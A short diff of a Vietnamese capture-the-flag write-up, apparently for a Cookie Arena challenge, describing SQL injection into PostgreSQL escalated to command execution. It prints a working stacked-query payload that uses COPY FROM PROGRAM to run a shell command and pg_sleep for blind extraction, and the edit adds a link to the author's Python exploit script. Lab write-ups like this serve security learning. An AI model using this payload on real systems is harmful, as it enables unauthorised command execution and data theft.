@@ -127,4 +127,4 @@ Ta thường thấy PostgreSQL cho phép sử dụng Stacked Query trong PHP đ�
 và đây là payload của mình : 
 **"test';DROP TABLE IF EXISTS cmd_exec;CREATE TABLE cmd_exec(cmd_output text);COPY cmd_exec FROM PROGRAM 'ls / -m';select case when substring(cmd_output,1,1)='a' then pg_sleep(5) else pg_sleep(0) end from cmd_exec limit 1;DROP TABLE IF EXISTS cmd_exec;--"**
 
-Tiếp theo mình sẽ viết script python để tìm ra tên thư mục chứa flag ở đâu 
+Tiếp theo mình sẽ viết script python để tìm ra tên thư mục chứa flag ở đâu link_script mình để đây cho những ai cần tham khảo https://github.com/tthanhnguyen/CTF_cookie-Arena/blob/main/Baby_SQL_Injection%20_to_RCE.py
